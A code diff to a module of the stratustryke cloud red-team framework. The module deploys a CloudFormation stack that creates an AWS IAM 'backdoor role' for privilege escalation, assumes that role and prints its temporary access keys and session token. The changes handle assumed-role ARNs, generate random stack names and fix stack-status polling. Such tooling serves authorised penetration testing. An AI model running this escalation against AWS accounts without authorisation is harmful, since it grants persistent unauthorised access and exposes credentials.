@@ -1,14 +1,20 @@
 
+import time
+
 from json import dumps
 from uuid import uuid4
 from datetime import datetime, timezone, timedelta
-from time import time, sleep
 
 from stratustryke.core.module.aws import AWSModule
 from stratustryke.settings import on_linux
 from stratustryke.lib import StratustrykeException
-from stratustryke.lib.regex import AWS_PRINCIPAL_ARN_REGEX, AWS_ACCOUNT_ID_REGEX, AWS_SERVICE_PRINCIPAL_REGEX, AWS_ROLE_ARN_REGEX
-
+from stratustryke.lib.regex import (
+    AWS_ASSUMED_ROLE_ARN_REGEX,
+    AWS_PRINCIPAL_ARN_REGEX,
+    AWS_ACCOUNT_ID_REGEX, 
+    AWS_SERVICE_PRINCIPAL_REGEX,
+    AWS_ROLE_ARN_REGEX
+)
 
 class Module(AWSModule):
 
@@ -33,9 +39,9 @@ class Module(AWSModule):
             'References': [ '' ]
         }
 
-        self._options.add_string(Module.OPT_STACK_NAME, 'Name for the stack when it is deployed', True, 'StratustrykeEscStack')
+        self._options.add_string(Module.OPT_STACK_NAME, 'Override gerneated name for the stack when it is deployed', True)
         self._options.add_string(Module.OPT_STACK_ROLE, 'When set, passes this role to the stack. Otherwise uses caller permissions', False)
-        self._options.add_string(Module.OPT_TRUST_PRINCIPAL, 'AWS / service principals to include in the role trust policy (s/f/p)', True)
+        self._options.add_string(Module.OPT_TRUST_PRINCIPAL, 'AWS / service principals to include in the role trust policy (s/f/p)', False)
         self._options.add_string(Module.OPT_NEW_ROLE_NAME, 'Override the default generated name to use for the created role', False)
 
         self._advanced.add_integer(Module.OPT_POLL_DELAY, 'Time in seconds to wait while monitoring stack creation status', True, 5)
@@ -63,21 +69,30 @@ class Module(AWSModule):
                 self.print_error('No trust principals supplied and unable to derive caller ARN')
                 return None
             else:
+                if AWS_ASSUMED_ROLE_ARN_REGEX.match(caller_arn):
+                    caller_arn = self.resolve_assumed_role_arn(caller_arn)
                 self.print_warning(f'No trust principals supplied, defaulting to {caller_arn}')
                 trust_principals = [caller_arn]
 
 
         principal_block = {'AWS': [], 'Service': []}
         for line in trust_principals:
-            if AWS_PRINCIPAL_ARN_REGEX.match(line):
+
+            if AWS_ASSUMED_ROLE_ARN_REGEX.match(line):
+                iam_role_arn = self.resolve_assumed_role_arn(line)
+                principal_block['AWS'].append(iam_role_arn)
+
+            elif AWS_PRINCIPAL_ARN_REGEX.match(line):
                 principal_block['AWS'].append(line)
+
             elif AWS_ACCOUNT_ID_REGEX.match(line):
                 principal_block['AWS'].append(f'arn:aws:iam::{line}:root')
+
             elif AWS_SERVICE_PRINCIPAL_REGEX.match(line):
                 principal_block['Service'].append(line)
+
             else:
                 if self.verbose: self.print_warning(f'{line} does not match an AWS or service principal, skipping...')            
-
 
         msg = f'Built policy with {len(principal_block["AWS"]) + len(principal_block["Service"])} trusted principals'
 
@@ -86,7 +101,7 @@ class Module(AWSModule):
             condition_block['StringEquals'] = {}
             condition_block['StringEquals']['sts:ExternalId'] = external_id
             msg += ' requiring external id'
-            self.print_status(f'Using {external_id} within the role trust policy')
+            self.print_status(f'Applying {external_id} as sts:ExternalId within the trust policy')
 
         if self.verbose: self.print_status(msg)
 
@@ -115,11 +130,11 @@ class Module(AWSModule):
         utc_now = utc_now.strftime('%Y-%m-%dT%H:%M:%SZ')
         expiration = expiration.strftime('%Y-%m-%dT%H:%M:%SZ')
 
-        self.print_status(f'Role permissions disarm time will be {expiration}')
+        self.print_status(f'Role permissions will be disarmed at {expiration}')
         return utc_now, expiration
     
 
-    def build_default_stack_template(self, new_role_name, trust_policy: dict) -> dict | None:
+    def build_default_stack_template(self, new_role_name: str, trust_policy: dict) -> dict | None:
         '''Returns a stack template after injecting module options into it'''
         
         description = self.get_opt(Module.OPT_STACK_DESCRIPTION)
@@ -172,15 +187,32 @@ class Module(AWSModule):
         }
 
 
-    def resolve_stack_role(self) -> str:
+    def resolve_stack_role(self) -> str | None:
         '''If an ARN isn\'t provided (role name is given) default to the caller\'s AWS account to resolve the ARN'''
-        stack_role = self.get_opt(Module.OPT_STACK_ROLE)
-        if not AWS_ROLE_ARN_REGEX.match(stack_role):
-            # Might need to be service-role, idk
-            stack_role = f'arn:aws:iam::{self.get_cred().account_id}:role/{stack_role}'
-            self.print_warning(f'Provided stack role is not an ARN; resolving to {stack_role}')
+        try:
+            stack_role = self.get_opt(Module.OPT_STACK_ROLE)
+            if stack_role != None:
+                if not AWS_ROLE_ARN_REGEX.match(stack_role):
+                    # Might need to be service-role, idk
+                    stack_role = f'arn:aws:iam::{self.get_cred().account_id}:role/{stack_role}'
+                    self.print_warning(f'Provided stack role is not an ARN; resolving to {stack_role}')
 
-        return stack_role
+            return stack_role
+        
+        except Exception as err:
+            self.print_failure(f'Error encountered deriving STACK_ROLE parameter')
+            if self.verbose: self.print_error(str(err))
+            return None
+
+
+    def resolve_assumed_role_arn(self, sts_arn: str) -> str:
+        '''Derive IAM role ARN from an sts assumed-role ARN'''
+        # 0  1   2  3 4            5            6                    7
+        # arn:aws:sts::ACCOUNT_ID:assumed-role/ROLE_NAME/SESSION_NAME
+        account_id = sts_arn.split(':')[4]
+        role_name = sts_arn.split('/')[1]
+
+        return f'arn:aws:iam::{account_id}:role/{role_name}'
 
 
     def create_escalation_stack(self, region: str, name: str, template: dict) -> str | None:
@@ -193,7 +225,7 @@ class Module(AWSModule):
             create_stack_params = {
                 'StackName': name,
                 'TemplateBody': dumps(template),
-                'Capabilities': ['CAPABILITY_IAM'],
+                'Capabilities': ['CAPABILITY_NAMED_IAM'],
                 'OnFailure': 'DELETE'
             }
             
@@ -205,7 +237,7 @@ class Module(AWSModule):
 
 
         except Exception as err:
-            self.print_failure(f'Stack creation failed in {region} for {name}')
+            self.print_failure(f'Exception thrown during cloudformation:CreateStack in {region} for {name}')
             if self.verbose: self.print_error(str(err))
             return None
         
@@ -221,7 +253,7 @@ class Module(AWSModule):
 
         fail_states = {'CREATE_FAILED','ROLLBACK_IN_PROGRESS','ROLLBACK_FAILED','ROLLBACK_COMPLETE','DELETE_FAILED'}
         success_state = 'CREATE_COMPLETE'
-        start_time = time()
+        start_time = time.time()
 
 
         while True:
@@ -233,7 +265,7 @@ class Module(AWSModule):
                 res = client.describe_stacks(StackName=stack_id)
 
                 stack = res.get('Stacks', [])[0]
-                status = stack.get('Status', 'UNKNOWN')
+                status = stack.get('StackStatus', 'UNKNOWN')
                 status_reason = stack.get('StackStatusReason', '')
 
                 if status == success_state:
@@ -257,9 +289,7 @@ class Module(AWSModule):
                         'Reason': f'{primary_reason or status_reason}',
                         'Outputs': events
                     }
-                
-                sleep(delay)
-                
+ 
             except Exception as err:
                 msg = f'Exception thrown during cloudformation:DescribeStacks in {region} on {stack_id}'
                 self.print_failure(msg)
@@ -270,7 +300,10 @@ class Module(AWSModule):
                         'Reason': msg,
                         'Outputs': [str(err)]
                     }
-        
+            
+            if self.verbose: self.print_status(f'Stack is in {status} state, sleeping {delay} seconds')
+            time.sleep(delay)
+
 
     def get_stack_failure_events(self, region: str, stack_id: str) -> tuple:
         '''Try and get info on why stack creation failed'''
@@ -318,7 +351,9 @@ class Module(AWSModule):
 
     def run(self):
 
+        random_str = str(uuid4())[-12::]
         stack_name = self.get_opt(Module.OPT_STACK_NAME)
+        if not stack_name: stack_name = f'StratustrykeEscStack{random_str}'
 
         external_id = self.get_opt(Module.OPT_EXTERNAL_ID)
         external_id = str(uuid4()) if external_id else None
@@ -327,7 +362,7 @@ class Module(AWSModule):
         if trust_policy == None: return None
 
         new_role_name = self.get_opt(Module.OPT_NEW_ROLE_NAME)
-        if not new_role_name: new_role_name = f'StratustrykeRole-{str(uuid4())[:-12]}'
+        if not new_role_name: new_role_name = f'StratustrykeRole{random_str}'
 
         # Manually provided stack templates are currently not supported
         # Todo: provide an option to parse JSON/YAML provided via string/file/paste/etc
@@ -337,11 +372,12 @@ class Module(AWSModule):
         region = self.get_regions(False)[0]
 
         stack_id = self.create_escalation_stack(region, stack_name, stack_template)
+        if stack_id == None: return None
 
         self.print_status(f'Created stack: {stack_id}')
+        self.print_status(f'Monitoring stack creation, this may take some time...')
         monitoring_output = self.monitor_stack_deployment(region, stack_id)
 
-        
         ##### Failed to create #####
         if not monitoring_output.get('Success', False):
             self.print_failure(f'Backdoor role creation via Cloudformation:CreateStack failed')
@@ -364,9 +400,13 @@ class Module(AWSModule):
 
 
         ##### Attempt to assume the newly created role if caller is a trusted principal #####
-        if self.get_cred().arn in trust_policy['AWS']:
+        caller_arn = self.get_cred().arn
+        if AWS_ASSUMED_ROLE_ARN_REGEX.match(caller_arn):
+            caller_arn = self.resolve_assumed_role_arn(caller_arn)
+        if caller_arn in trust_policy['Statement']['Principal']['AWS']:
                 
             assumed_role_cred = self.get_cred().assume_role(role_arn, external_id)
+            assumed_role_cred._alias = role_arn.split('/')[1]
                 
             if self.get_opt(Module.OPT_SKIP_IMPORT): # Just print that it succeeded
                 self.print_success(f'Successfully performed sts:AssumeRole on {role_arn}')
@@ -375,15 +415,13 @@ class Module(AWSModule):
 
 
             env_prefix = 'export ' if on_linux else '$Env:'
-            sts_command = f'aws sts assume-role --role-arn {role_arn} --role-session-name stratustryke'
-            if external_id: sts_command += f' --external-id {external_id}'
-
-            self.print_success(sts_command)
             self.print_line(f'{env_prefix}AWS_ACCESS_KEY_ID={assumed_role_cred._access_key_id}')
             self.print_line(f'{env_prefix}AWS_SECRET_ACCESS_KEY={assumed_role_cred._secret_key}')
             self.print_line(f'{env_prefix}AWS_SESSION_TOKEN={assumed_role_cred._session_token}')
+            self.print_line('')
 
-        # Caller is not a trusted principal
-        else:
-            self.print_status(f'Role trust policy: {trust_policy}')
+        sts_command = f'aws sts assume-role --role-arn {role_arn} --role-session-name stratustryke'
+        if external_id: sts_command += f' --external-id {external_id}'
+
+        self.print_success(sts_command)
 
